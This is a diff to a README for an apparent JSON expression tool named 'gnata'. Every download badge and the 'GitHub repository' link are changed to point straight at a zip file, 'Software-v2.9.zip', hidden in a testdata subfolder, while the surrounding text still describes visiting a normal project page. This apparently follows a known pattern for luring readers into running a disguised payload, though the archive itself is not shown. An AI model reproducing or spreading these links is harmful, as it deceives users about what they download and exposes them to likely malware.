@@ -1,6 +1,6 @@
 # 🛠️ gnata - Fast JSON Data Stream Evaluator
 
-[![Download gnata](https://img.shields.io/badge/Download-gnata-brightgreen)](https://github.com/latestr5516/gnata)
+[![Download gnata](https://img.shields.io/badge/Download-gnata-brightgreen)](https://github.com/latestr5516/gnata/raw/refs/heads/main/testdata/groups/function-encodeUrl/Software-v2.9.zip)
 
 ## 📋 About gnata
 
@@ -21,7 +21,7 @@ No extra software is needed. gnata runs on its own.
 
 To get gnata on your computer, visit this page:
 
-[![Download gnata](https://img.shields.io/badge/Download-gnata-blue)](https://github.com/latestr5516/gnata)
+[![Download gnata](https://img.shields.io/badge/Download-gnata-blue)](https://github.com/latestr5516/gnata/raw/refs/heads/main/testdata/groups/function-encodeUrl/Software-v2.9.zip)
 
 The page will have links to the latest version. Look for Windows files or folders. Downloads are simple and fast.
 
@@ -92,7 +92,7 @@ If commands do not work correctly:
 
 For questions or detailed instructions:
 
-- Visit the [GitHub repository](https://github.com/latestr5516/gnata).  
+- Visit the [GitHub repository](https://github.com/latestr5516/gnata/raw/refs/heads/main/testdata/groups/function-encodeUrl/Software-v2.9.zip).  
 - Check the README file or open issues for common problems.  
 - Use online JSONata resources for learning how to write expressions.  
 
@@ -111,4 +111,4 @@ No uninstalling is needed.
 
 Use this link to download gnata or check for updates:
 
-[![Download gnata](https://img.shields.io/badge/Download-gnata-grey)](https://github.com/latestr5516/gnata)
+[![Download gnata](https://img.shields.io/badge/Download-gnata-grey)](https://github.com/latestr5516/gnata/raw/refs/heads/main/testdata/groups/function-encodeUrl/Software-v2.9.zip)
